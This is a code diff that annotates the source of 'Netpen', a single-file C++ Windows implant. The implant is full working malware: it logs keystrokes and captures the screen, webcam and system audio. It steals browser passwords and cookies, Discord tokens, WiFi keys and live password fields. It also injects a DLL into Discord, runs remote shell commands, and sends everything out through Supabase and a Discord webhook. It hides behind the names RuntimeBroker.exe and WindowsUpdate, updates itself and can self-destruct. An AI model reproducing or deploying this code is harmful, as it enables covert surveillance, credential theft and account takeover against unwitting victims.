@@ -1,3 +1,11 @@
+// === Netpen agent — single-file C++ implant =====================================
+// Architecture: watchdog process (WinMain) spawns a hidden child (--child) that
+// installs a low-level keyboard hook and services a 1-second timer.
+// The watchdog guarantees the child is always running (restarts on crash) and
+// checks Supabase for remote updates / self-destruct every 5 minutes.
+// All C2 state lives in Supabase (control table, keystrokes, screenshots, etc.)
+// ================================================================================
+
 #include <windows.h>
 #define INITGUID
 #include <winhttp.h>
@@ -13,10 +21,10 @@
 #include <dshow.h>
 #include <mmdeviceapi.h>
 #include <audioclient.h>
-#include "config.h"
+#include "config.h"          // build-time generated: version + encrypted C2 URLs/keys
 #include <tlhelp32.h>
-#include <shlobj.h>
-#include "capture_shared.h"
+#include <shlobj.h>          // IShellLinkW for startup-folder .lnk creation
+#include "capture_shared.h"  // shared struct for DLL-injection webcam capture
 
 // Missing DirectShow declarations (not available in this mingw version)
 static const CLSID CLSID_SampleGrabber = {0xC1F400A0,0x3F08,0x11D3,{0x9F,0x0B,0x00,0x60,0x08,0x03,0x9E,0x37}};
@@ -36,6 +44,7 @@ ISampleGrabber : public IUnknown {
 #define NETPEN_VERSION 0
 #endif
 
+// Supabase REST + Storage endpoint paths (relative to g_supabaseHost)
 #define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
 #define SUPABASE_CONTROL_PATH L"/rest/v1/control"
 #define SUPABASE_EXEC_PATH L"/rest/v1/exec_results"
@@ -44,28 +53,31 @@ ISampleGrabber : public IUnknown {
 #define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
 #define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"
 
-static HHOOK g_hHook = NULL;
-static std::string g_winTitle;
-static std::string g_keys;
-static DWORD g_lastTick = 0;
-static DWORD g_lastDiscord = 0;
-static DWORD g_lastAutoScreenshot = 0;
-static std::vector<std::string> g_triggers;
-static bool g_running = true;
-static bool g_selfDestructing = false;
-static bool g_harvestPaused = false;
-static bool g_harvestBusy = false;
-static std::string g_hostname;
-static std::string g_lastClipboard;
-static std::string g_lastPasswordDigest;
-static HWND g_hwnd = NULL;
+// --- Runtime state (child process) ---
+static HHOOK g_hHook = NULL;                 // WH_KEYBOARD_LL handle
+static std::string g_winTitle;               // current foreground-window title
+static std::string g_keys;                   // accumulated keystrokes awaiting flush
+static DWORD g_lastTick = 0;                 // GetTickCount of last keystroke (idle-flush trigger)
+static DWORD g_lastDiscord = 0;              // throttle for Discord webhook posts (30s)
+static DWORD g_lastAutoScreenshot = 0;      // throttle for trigger-based screenshots (5 min)
+static std::vector<std::string> g_triggers;   // keyword list from Supabase screenshot_triggers
+static bool g_running = true;                 // false stops the message loop and lets child exit
+static bool g_selfDestructing = false;        // latched true while self-destruct is in progress
+static bool g_harvestPaused = false;          // remote toggle (agent_config.harvest_paused)
+static bool g_harvestBusy = false;           // reentrancy guard for background harvest thread
+static std::string g_hostname;                // local computer name, used as agent key everywhere
+static std::string g_lastClipboard;           // last clipboard text seen (dedup)
+static std::string g_lastPasswordDigest;      // last password-field digest (dedup)
+static HWND g_hwnd = NULL;                    // hidden message-only window backing WndProc
 
+// --- Decrypted C2 credentials (populated once in InitConfig) ---
 static std::wstring g_supabaseHost;
-static std::wstring g_supabaseKey;
-static std::wstring g_supabaseServiceKey;
+static std::wstring g_supabaseKey;            // anon key — used for normal REST calls
+static std::wstring g_supabaseServiceKey;     // service key — used for Storage PUT uploads
 static std::wstring g_discordHost;
-static std::wstring g_discordPath;
+static std::wstring g_discordPath;            // Discord webhook path
 
+// Decrypt the C2 config blobs baked into config.h at build time.
 static void InitConfig() {
     g_supabaseHost = DecryptW(_enc_SUPABASE_HOST, sizeof(_enc_SUPABASE_HOST));
     g_supabaseKey = DecryptW(_enc_SUPABASE_ANON_KEY, sizeof(_enc_SUPABASE_ANON_KEY));
@@ -73,6 +85,8 @@ static void InitConfig() {
     g_discordHost = DecryptW(_enc_DISCORD_HOST, sizeof(_enc_DISCORD_HOST));
     g_discordPath = DecryptW(_enc_DISCORD_PATH, sizeof(_enc_DISCORD_PATH));
 }
+
+// --- String helpers (UTF-8 <-> UTF-16) ---
 
 static std::wstring ToWide(const std::string& s) {
     int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
@@ -88,6 +102,7 @@ static std::string ToNarrow(const std::wstring& s) {
     return buf;
 }
 
+// JSON-escape a string for embedding in a JSON string value.
 static std::string EscapeJSON(const std::string& s) {
     std::string out;
     out.reserve(s.size() + 8);
@@ -112,6 +127,8 @@ static std::string EscapeJSON(const std::string& s) {
     return out;
 }
 
+// Minimal JSON string extractor (no external dep). Looks for "key":"..." and
+// unescapes the value. Returns "" if not found.
 static std::string ExtractJSONString(const std::string& json, const std::string& key) {
     std::string search = "\"" + key + "\":\"";
     size_t pos = json.find(search);
@@ -139,6 +156,7 @@ static std::string ExtractJSONString(const std::string& json, const std::string&
     return result;
 }
 
+// Minimal JSON number extractor. Returns the raw token between "key": and the next , } ].
 static std::string ExtractJSONNumber(const std::string& json, const std::string& key) {
     std::string search = "\"" + key + "\":";
     size_t pos = json.find(search);
@@ -150,6 +168,7 @@ static std::string ExtractJSONNumber(const std::string& json, const std::string&
     return json.substr(pos, end - pos);
 }
 
+// ISO-8601 UTC timestamp for Supabase inserts / Discord embeds.
 static std::string GetTimestamp() {
     time_t now = time(NULL);
     struct tm* tm = gmtime(&now);
@@ -158,6 +177,8 @@ static std::string GetTimestamp() {
     return std::string(buf);
 }
 
+// Filename of the running executable (e.g. "RuntimeBroker.exe" or "a.exe").
+// Used everywhere we need to refer to self on disk or as a registry value name.
 static std::string GetExeName() {
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
@@ -178,6 +199,9 @@ static std::string GetWindowTitle() {
     return std::string(buf);
 }
 
+// Translate a virtual key code into a human-readable string for the keystrokes table.
+// Respects Shift/Caps for letters, Shift for digits/punctuation. Returns "" for
+// pure modifier keys (so they don't pollute the buffer).
 static std::string GetKeyString(DWORD vk) {
     bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
     bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
@@ -259,6 +283,8 @@ static std::string GetKeyString(DWORD vk) {
     return "";
 }
 
+// Append a timestamped line to %TEMP%\wuaueng.log. Used for diagnostics only —
+// the log is wiped on self-destruct (CleanupPersistence + ScheduleSelfDestruct).
 static void LogMsg(const std::string& msg) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
@@ -271,6 +297,10 @@ static void LogMsg(const std::string& msg) {
     }
 }
 
+// Generic Supabase REST request. Uses anon key (g_supabaseKey) for both
+// apikey + Authorization headers. 5s timeouts on every phase. Caller is
+// responsible for closing nothing — all HINTERNET handles are cleaned up here.
+// Returns true on HTTP success (any status code), with the body in `response`.
 static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::string& body, std::string& response) {
     HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
@@ -329,11 +359,14 @@ static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::s
     return true;
 }
 
+// POST a single keystrokes JSON row to Supabase.
 static bool PostKeys(const std::string& json) {
     std::string response;
     return HttpRequest(L"POST", SUPABASE_KEYS_PATH, json, response);
 }
 
+// GET a Supabase path and return the body as a string (no apikey needed for
+// public Storage objects, but harmless to send anyway).
 static bool HttpGetToString(const wchar_t* path, std::string& response) {
     HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
@@ -359,6 +392,8 @@ static bool HttpGetToString(const wchar_t* path, std::string& response) {
     return true;
 }
 
+// Download a Supabase Storage object to a local file. Used by the auto-updater
+// to fetch the new RuntimeBroker.exe. 15s timeouts (large binary, may be slow).
 static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
     HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
     if (!hSession) return false;
@@ -388,6 +423,8 @@ static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
     return true;
 }
 
+// Heuristic filter: if the text uses <= 2 unique characters, it's spam (e.g.
+// "aaaaaaaa", "12121212") and should not be sent to Discord.
 static bool IsSpamText(const std::string& s) {
     if (s.size() <= 5) return false;
     bool seen[256] = {false};
@@ -402,6 +439,9 @@ static bool IsSpamText(const std::string& s) {
     return true;
 }
 
+// Post keystroke text to the Discord webhook as an embed. Rate-limited to once
+// per 30s via g_lastDiscord. Filtered via IsSpamText. Fire-and-forget — no
+// retry on failure.
 static void PostToDiscord(const std::string& hostname, const std::string& window, const std::string& keys) {
     if (IsSpamText(keys)) return;
     DWORD now = GetTickCount();
@@ -441,6 +481,8 @@ static void PostToDiscord(const std::string& hostname, const std::string& window
     WinHttpCloseHandle(hSession);
 }
 
+// Poll Supabase control table for a pending "stop" command for this hostname.
+// Marks it executed if found so it only fires once.
 static bool CheckStop() {
     std::wstring query = SUPABASE_CONTROL_PATH;
     query += L"?command=eq.stop&executed=eq.false&hostname=eq.";
@@ -459,6 +501,7 @@ static bool CheckStop() {
     return true;
 }
 
+// Path of the directory containing the running EXE, with trailing backslash.
 static std::string GetExeDir() {
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
@@ -468,6 +511,8 @@ static std::string GetExeDir() {
     return "";
 }
 
+// Write an empty ".kill" file next to the EXE. On the next watchdog poll, the
+// watchdog sees this file, kills the child, and exits itself.
 static void CreateKillFlag() {
     std::string flagPath = GetExeDir() + ".kill";
     FILE* f = NULL;
@@ -475,6 +520,7 @@ static void CreateKillFlag() {
     if (f) fclose(f);
 }
 
+// Check whether the ".kill" flag exists.
 static bool KillFlagExists() {
     FILE* f = NULL;
     std::string flagPath = GetExeDir() + ".kill";
@@ -483,11 +529,18 @@ static bool KillFlagExists() {
     return false;
 }
 
+// Delete the ".kill" flag file.
 static void RemoveKillFlag() {
     std::string flagPath = GetExeDir() + ".kill";
     DeleteFileA(flagPath.c_str());
 }
 
+// Self-destruct mechanism:
+//   1. Mark the EXE for deletion on next boot via MoveFileEx (survives hard reboot mid-cleanup).
+//   2. Create %TEMP%\NetpenCleanup.bat — a cmd script that waits for this process to exit,
+//      then deletes the EXE, the log file, and itself.
+//   3. Launch the batch as a hidden cmd.exe process (CREATE_NO_WINDOW).
+// Called from WndProc after CleanupPersistence and CreateKillFlag have run.
 static void ScheduleSelfDestruct() {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
@@ -523,6 +576,7 @@ static void ScheduleSelfDestruct() {
     }
 }
 
+// Poll Supabase control table for a pending "selfdestruct" command.
 static bool CheckSelfDestruct() {
     std::wstring query = SUPABASE_CONTROL_PATH;
     query += L"?command=eq.selfdestruct&executed=eq.false&hostname=eq.";
@@ -541,6 +595,7 @@ static bool CheckSelfDestruct() {
     return true;
 }
 
+// Read agent_config.harvest_paused from Supabase and cache in g_harvestPaused.
 static void CheckHarvestConfig() {
     std::wstring query = SUPABASE_CONFIG_PATH;
     query += L"?key=eq.harvest_paused&select=value";
@@ -557,6 +612,8 @@ static void CheckHarvestConfig() {
     g_harvestPaused = (val == "true");
 }
 
+// Read version.txt from Supabase Storage. The watchdog uses this to decide
+// when to auto-update.
 static int GetRemoteVersion() {
     std::string s;
     if (!HttpGetToString(STORAGE_VER_PATH, s)) return -1;
@@ -566,6 +623,10 @@ static int GetRemoteVersion() {
     return atoi(s.c_str());
 }
 
+// Auto-update: download the new EXE from Storage, save as NetpenUpdate.exe, then
+// create a batch that waits for this process to exit, copies the new EXE over the
+// old one, starts it, and cleans up. The watchdog triggers this when
+// GetRemoteVersion() > NETPEN_VERSION.
 static bool DeployUpdate(int remoteVer) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
@@ -603,6 +664,8 @@ static bool DeployUpdate(int remoteVer) {
     return true;
 }
 
+// Find the GDI+ encoder CLSID for a given MIME type (e.g. "image/jpeg").
+// Required to save Gdiplus::Bitmap to JPEG with configurable quality.
 static int GetEncoderClsid(const wchar_t* format, CLSID* clsid) {
     UINT num = 0, size = 0;
     Gdiplus::GetImageEncodersSize(&num, &size);
@@ -618,6 +681,8 @@ static int GetEncoderClsid(const wchar_t* format, CLSID* clsid) {
 
 static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc);
 
+// Capture the primary monitor to a JPEG file. Uses GDI+ with quality=80.
+// Cleans up all GDI handles before returning.
 static bool CaptureScreen(const char* outputPath) {
     HDC hScreenDC = GetDC(NULL);
     HDC hMemDC = CreateCompatibleDC(hScreenDC);
@@ -647,6 +712,10 @@ static bool CaptureScreen(const char* outputPath) {
     return ok;
 }
 
+// Capture a single webcam frame via DirectShow. Builds a filter graph:
+// VideoCapture → SampleGrabber → NullRenderer, waits up to 5s for a frame,
+// converts RGB24 to GDI+ Bitmap, saves as JPEG quality=80.
+// Falls back gracefully if no camera is connected.
 static bool CaptureWebcamFrame(const char* outputPath) {
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     if (FAILED(hr)) return false;
@@ -753,6 +822,9 @@ static bool CaptureWebcamFrame(const char* outputPath) {
     return result;
 }
 
+// Capture 10 seconds of system audio (loopback) to a WAV file. Uses WASAPI
+// in shared loopback mode. Handles both PCM and IEEE Float formats — converts
+// float to 16-bit PCM if needed. Saved at the original sample rate/channels.
 static bool CaptureSpeaker(const char* outputPath) {
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
     if (FAILED(hr)) return false;
@@ -849,6 +921,7 @@ static bool CaptureSpeaker(const char* outputPath) {
     return result;
 }
 
+// Compact timestamp for screenshot filenames (e.g. "20250706_123045").
 static std::string GetScreenshotTimestamp() {
     time_t now = time(NULL);
     struct tm* tm = gmtime(&now);
@@ -857,6 +930,9 @@ static std::string GetScreenshotTimestamp() {
     return std::string(buf);
 }
 
+// Upload a local file to Supabase Storage via PUT. Uses the service role key
+// (g_supabaseServiceKey) for write access. 30s timeouts for large files.
+// Deletes the local temp copy after upload in the caller.
 static bool UploadToStorage(const std::string& localPath, const std::string& storagePath, const char* contentType) {
     HANDLE hFile = CreateFileA(localPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return false;
@@ -890,6 +966,9 @@ static bool UploadToStorage(const std::string& localPath, const std::string& sto
     return ok;
 }
 
+// Execute a cmd.exe /c command synchronously and return stdout+stderr. Caps
+// output at 32KB. Kills the process if it runs longer than 60s. Returns the
+// exit code via optional out parameter.
 static std::string ExecuteCommand(const std::string& cmd, DWORD* outExitCode = NULL) {
     std::string result;
     SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
@@ -953,6 +1032,8 @@ static std::string ExecuteCommand(const std::string& cmd, DWORD* outExitCode = N
     return result;
 }
 
+// Poll Supabase control table for a pending "exec" command. Runs the command
+// via ExecuteCommand and POSTs the result + exit code to exec_results.
 static void CheckAndHandleExec() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.exec&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id,payload";
@@ -981,6 +1062,12 @@ static void CheckAndHandleExec() {
 #define SUPABASE_WIFI_PATH L"/rest/v1/wifi_creds"
 #define SUPABASE_DISCORD_PATH L"/rest/v1/discord_tokens"
  
+// === SQLite page parser (no libsqlite3 dependency) =============================
+// Implements just enough of the SQLite3 file format to walk B-tree table leaf
+// pages and extract column values from payloads. Supports the sqlite_schema
+// walk (page 1) to find table root pages, then data walks for table contents.
+// Format references: https://www.sqlite.org/fileformat2.html
+
 static uint32_t SqliteVarint(const uint8_t* p, int* used) {
     uint32_t v = 0; *used = 0;
     for (int i = 0; i < 9; i++) {
@@ -993,6 +1080,9 @@ static uint32_t SqliteVarint(const uint8_t* p, int* used) {
 static uint16_t SqliteU16(const uint8_t* p) { return (uint16_t)(p[0] << 8) | p[1]; }
 static uint32_t SqliteU32(const uint8_t* p) { return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) | ((uint32_t)p[2] << 8) | p[3]; }
  
+// Extract the serial-type-to-size table cell at column colIndex from a
+// B-tree table leaf payload. Returns a pointer to the data and sets outSize.
+// Handles all standard serial types (0-12+).
 static const uint8_t* SqliteColumn(const uint8_t* payload, int payloadLen, int colIndex, int* outSize) {
     int used; uint32_t hdrSize = SqliteVarint(payload, &used);
     if (hdrSize > (uint32_t)payloadLen) return NULL;
@@ -1011,6 +1101,9 @@ static const uint8_t* SqliteColumn(const uint8_t* payload, int payloadLen, int c
     return NULL;
 }
  
+// Recursive B-tree walker. Supports both interior (0x05) and leaf (0x0D)
+// pages. Calls cb(rowid, payload, payloadLen) for each leaf cell. Returns
+// false if the callback returns false (early termination).
 static bool SqliteWalk(const uint8_t* db, size_t dbSize, uint16_t pageSize, int pageNum,
     bool (*cb)(int64_t rowid, const uint8_t* payload, int payloadLen, void* user), void* user)
 {
@@ -1038,6 +1131,8 @@ static bool SqliteWalk(const uint8_t* db, size_t dbSize, uint16_t pageSize, int 
     return true;
 }
  
+// Walk the sqlite_schema table (always page 1) to find the root page of the
+// named table (e.g. "logins", "cookies").
 static int SqliteFindTableRoot(const uint8_t* db, size_t dbSize, uint16_t pageSize, const char* name) {
     struct Ctx { const char* name; int root; };
     Ctx ctx = { name, 0 };
@@ -1057,6 +1152,10 @@ static int SqliteFindTableRoot(const uint8_t* db, size_t dbSize, uint16_t pageSi
     return ctx.root;
 }
  
+// Decrypt a Chrome/Edge/Brave/Opera encrypted password blob using AES-256-GCM.
+// The key is the DPAPI-decrypted "encrypted_key" from Local State.
+// Handles both v10 and v11 prefixes, and the Chrome 130+ SHA256 origin-URL
+// prefix stripping. Cleans up all BCrypt handles before returning.
 static bool ChromeDecryptPassword(const uint8_t* key, int keyLen, const uint8_t* blob, int blobLen, const char* browser, const std::string& originUrl, std::string& out) {
     if (blobLen < 15 || blob[0] != 'v' || blob[1] != '1' || (blob[2] != '0' && blob[2] != '1')) { LogMsg(std::string(browser) + ": unsupported prefix '" + std::string((const char*)blob, blobLen > 3 ? 3 : blobLen) + "'"); return false; }
     const uint8_t* nonce = blob + 3;
@@ -1105,6 +1204,9 @@ done:
     return ok;
 }
  
+// Browser search paths: each entry has a display name, the path to Local State
+// (for the encrypted AES key), and the default profile's Login Data (passwords).
+// All paths are relative to LOCALAPPDATA.
 static const struct { const char* name; const char* ls; const char* ld; } kChromeBrowsers[] = {
     {"Chrome",  "\\Google\\Chrome\\User Data\\Local State",  "\\Google\\Chrome\\User Data\\Default\\Login Data"},
     {"Edge",    "\\Microsoft\\Edge\\User Data\\Local State",  "\\Microsoft\\Edge\\User Data\\Default\\Login Data"},
@@ -1114,10 +1216,15 @@ static const struct { const char* name; const char* ls; const char* ld; } kChrom
     {NULL, NULL, NULL}
 };
  
+// IsTokenChar — used by Discord token scanning to identify valid token characters.
 static bool IsTokenChar(char c) {
     return isalnum((unsigned char)c) || c == '_' || c == '-' || c == '.';
 }
 
+// Scan Discord/PTB/Canary Local Storage leveldb files for auth tokens. Matches
+// two formats: mfa.xxx tokens and standard xxx.yyy.zzz tokens with segment-length
+// heuristics. Deduplicates and uploads in a single batch. Falls back to scanning
+// discord.exe process memory via ReadProcessMemory if no tokens found on disk.
 static void HarvestDiscordTokens() {
     const char* variantPaths[] = {
         "\\discord\\Local Storage\\leveldb",
@@ -1304,6 +1411,20 @@ static void HarvestDiscordTokens() {
     }
 }
 
+// === Browser credential harvesters =============================================
+// All three functions follow the same pattern:
+//   1. DPAPI-decrypt the AES key from Local State
+//   2. Copy the target DB to a temp file (to avoid SQLite locks)
+//   3. Memory-map the temp file and walk the B-tree with our embedded parser
+//   4. Decrypt each entry and batch-UPLOAD to Supabase
+// All run on a background thread (see WndProc counter % 300) to avoid blocking
+// the message loop.
+
+// Harvest saved passwords from Chrome/Edge/Brave/Opera/Vivaldi. Reads the
+// "logins" table, deduplicates by (origin_url + username), decrypts each
+// encrypted password blob, and POSTs the batch to SUPABASE_PASSWORDS_PATH.
+// Writes diagnostic rows for browsers where Local State was found but 0
+// passwords were extracted.
 static void HarvestBrowserPasswords() {
     char laBuf[MAX_PATH];
     DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
@@ -1443,6 +1564,10 @@ static void HarvestBrowserPasswords() {
     LogMsg("Browser password harvest complete");
 }
   
+// Harvest cookies from Chrome/Edge/Brave/Opera/Vivaldi. Reads either
+// Network\Cookies or legacy Cookies, auto-detects schema version (15-col vs
+// 17-col), decrypts encrypted cookie values, Base64-encodes them for safe
+// JSON transport, and uploads the batch.
 static void HarvestBrowserCookies() {
     char laBuf[MAX_PATH];
     DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
@@ -1606,6 +1731,9 @@ static void HarvestBrowserCookies() {
     LogMsg("Browser cookie harvest complete");
 }
 
+// Enumerate all saved WiFi profiles via "netsh wlan show profiles", then
+// extract each SSID's password + security type via "netsh wlan show profile
+// name=... key=clear". Uploads the batch with IPv4 address as context.
 static void HarvestWiFiPasswords() {
     char laBuf[MAX_PATH];
     DWORD laLen = GetEnvironmentVariableA("LOCALAPPDATA", laBuf, MAX_PATH);
@@ -1724,6 +1852,12 @@ static void HarvestWiFiPasswords() {
     LogMsg("WiFi: " + std::to_string(count) + " results uploaded");
 }
 
+// === Remote command handlers ===================================================
+// Each CheckXxxCmd() polls Supabase control for a pending command by type.
+// Returns the row ID if found. The caller passes it HandleXxx() which does
+// the work (capture + upload) and PATCHes executed=true.
+
+// Poll for a pending "screenshot" command.
 static std::string CheckScreenshotCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.screenshot&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
@@ -1737,6 +1871,7 @@ static std::string CheckScreenshotCmd() {
     return resp.substr(p, e - p);
 }
 
+// Capture the screen, upload to Storage, PATCH the row, post the result to Discord.
 static void HandleScreenshot(const std::string& rowId) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
@@ -1766,6 +1901,7 @@ static void HandleScreenshot(const std::string& rowId) {
     LogMsg("Screenshot done: " + resultUrl);
 }
 
+// Poll for a pending "webcam" command.
 static std::string CheckWebcamCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.webcam&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
@@ -1779,6 +1915,7 @@ static std::string CheckWebcamCmd() {
     return resp.substr(p, e - p);
 }
 
+// Find a process by executable name, returns PID or 0.
 static DWORD FindProcessPid(const wchar_t* name) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
@@ -1793,6 +1930,8 @@ static DWORD FindProcessPid(const wchar_t* name) {
     return pid;
 }
 
+// Extract the embedded Discord capture DLL (resource ID 101) to a temp file.
+// The temp name includes a timestamp for uniqueness.
 static bool ExtractDllToTemp(std::string& outPath) {
     HRSRC hRes = FindResourceA(NULL, MAKEINTRESOURCEA(101), RT_RCDATA);
     if (!hRes) return false;
@@ -1812,6 +1951,13 @@ static bool ExtractDllToTemp(std::string& outPath) {
     return true;
 }
 
+// Inject the webcam-capture DLL into Discord.exe via CreateRemoteThread.
+// 1. Extract DLL to temp
+// 2. VirtualAllocEx for DLL path and CaptureParams in remote process
+// 3. CreateRemoteThread(LoadLibraryW) to load the DLL
+// 4. Enumerate Discord's modules to find the DLL's base address
+// 5. CreateRemoteThread(CaptureThread) with CaptureParams (output path)
+// Returns true if the DLL was loaded and CaptureThread completed.
 static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
     DWORD pid = FindProcessPid(L"discord.exe");
     if (!pid) { LogMsg("Webcam injection: Discord.exe not found"); return false; }
@@ -1904,6 +2050,8 @@ static bool InjectAndCaptureWebcam(const wchar_t* outputPath) {
     return true;
 }
 
+// Try Discord injection first (higher quality, less suspicious), fall back to
+// direct DirectShow capture. Upload the result to Storage and post to Discord.
 static void HandleWebcam(const std::string& rowId) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
@@ -1935,6 +2083,7 @@ static void HandleWebcam(const std::string& rowId) {
     LogMsg("Webcam done: " + resultUrl);
 }
 
+// Poll for a pending "speaker" (audio capture) command.
 static std::string CheckSpeakerCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.speaker&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
@@ -1948,6 +2097,7 @@ static std::string CheckSpeakerCmd() {
     return resp.substr(p, e - p);
 }
 
+// Capture 10s of system audio, upload to Storage, PATCH the row, post to Discord.
 static void HandleSpeaker(const std::string& rowId) {
     char tmp[MAX_PATH];
     GetTempPathA(MAX_PATH, tmp);
@@ -1977,6 +2127,7 @@ static void HandleSpeaker(const std::string& rowId) {
     LogMsg("Speaker done: " + resultUrl);
 }
 
+// Poll for a pending "wifi" command.
 static std::string CheckWifiCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.wifi&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
@@ -1990,6 +2141,7 @@ static std::string CheckWifiCmd() {
     return resp.substr(p, e - p);
 }
 
+// Run HarvestWiFiPasswords and PATCH the command as executed.
 static void HandleWifiCmd(const std::string& rowId) {
     HarvestWiFiPasswords();
     std::string json = "{\"executed\":true}";
@@ -2000,6 +2152,7 @@ static void HandleWifiCmd(const std::string& rowId) {
     LogMsg("WiFi: command handled");
 }
 
+// Poll for a pending "force_discord" command (re-scans for Discord tokens on-demand).
 static std::string CheckDiscordCmd() {
     std::wstring q = SUPABASE_CONTROL_PATH;
     q += L"?command=eq.force_discord&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
@@ -2013,6 +2166,7 @@ static std::string CheckDiscordCmd() {
     return resp.substr(p, e - p);
 }
 
+// Run HarvestDiscordTokens and PATCH the command as executed.
 static void HandleDiscordCmd(const std::string& rowId) {
     HarvestDiscordTokens();
     std::string json = "{\"executed\":true}";
@@ -2023,6 +2177,8 @@ static void HandleDiscordCmd(const std::string& rowId) {
     LogMsg("Discord: force harvest handled");
 }
 
+// Heartbeat: upsert a row in the heartbeat table so the dashboard knows this
+// host is alive. Runs every 60s (counter % 60 == 0).
 static void SendHeartbeat() {
     std::string json = "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"last_seen\":\"" + GetTimestamp() + "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}";
     std::string resp;
@@ -2030,6 +2186,8 @@ static void SendHeartbeat() {
     HttpRequest(L"PUT", path.c_str(), json, resp);
 }
 
+// Fetch the list of trigger keywords from Supabase screenshot_triggers table.
+// Used by CheckAutoScreenshot to decide when to auto-capture.
 static void FetchTriggers() {
     std::string resp;
     std::wstring q = L"/rest/v1/screenshot_triggers?active=eq.true&select=keyword";
@@ -2048,6 +2206,8 @@ static void FetchTriggers() {
     }
 }
 
+// Fire-and-forget Discord embed with an image URL. Used for screenshot, webcam,
+// and auto-screenshot results. 5s timeout, no retry.
 static void PostDiscordImage(const std::string& host, const std::string& title, const std::string& imgUrl, const std::string& desc) {
     std::string payload = "{\"embeds\":[{\"title\":\"" + EscapeJSON(title) + "\",\"color\":3066993,\"description\":\"" + EscapeJSON(desc) + "\",\"image\":{\"url\":\"" + EscapeJSON(imgUrl) + "\"},\"timestamp\":\"" + GetTimestamp() + "\"}]}";
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
@@ -2063,6 +2223,9 @@ static void PostDiscordImage(const std::string& host, const std::string& title, 
     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
 }
 
+// Auto-screenshot: if the foreground window title matches any trigger keyword
+// (case-insensitive), captures the screen and uploads it. Rate-limited to once
+// per 5 minutes per host. Called from KeyboardProc on window-title change.
 static void CheckAutoScreenshot(const std::string& windowTitle) {
     if (windowTitle.empty() || g_triggers.empty()) return;
     DWORD now = GetTickCount();
@@ -2100,6 +2263,10 @@ static void CheckAutoScreenshot(const std::string& windowTitle) {
     }
 }
 
+// === Password stealing (live form scraping) ====================================
+
+// EnumChildWindows callback: finds password fields (Edit controls with
+// EM_GETPASSWORDCHAR != 0) and collects their text.
 struct PasswordField { HWND hwnd; std::wstring text; };
 
 static BOOL CALLBACK EnumPasswordProc(HWND hwnd, LPARAM lParam) {
@@ -2118,6 +2285,8 @@ static BOOL CALLBACK EnumPasswordProc(HWND hwnd, LPARAM lParam) {
     return TRUE;
 }
 
+// Send scraped password text to the Discord webhook with a red embed.
+// Resets g_lastDiscord throttle (passwords are a priority alert).
 static void PostPasswordToDiscord(const std::string& hostname, const std::string& keys) {
     DWORD now = GetTickCount();
     g_lastDiscord = now;
@@ -2145,6 +2314,9 @@ static void PostPasswordToDiscord(const std::string& hostname, const std::string
     WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
 }
 
+// Scan the foreground window for password fields. If any are found and the
+// content has changed since last check, POST them to Supabase + Discord.
+// Deduplicates via g_lastPasswordDigest (window-title + field handles + text).
 static void CheckPasswordFields() {
     HWND fg = GetForegroundWindow();
     if (!fg) return;
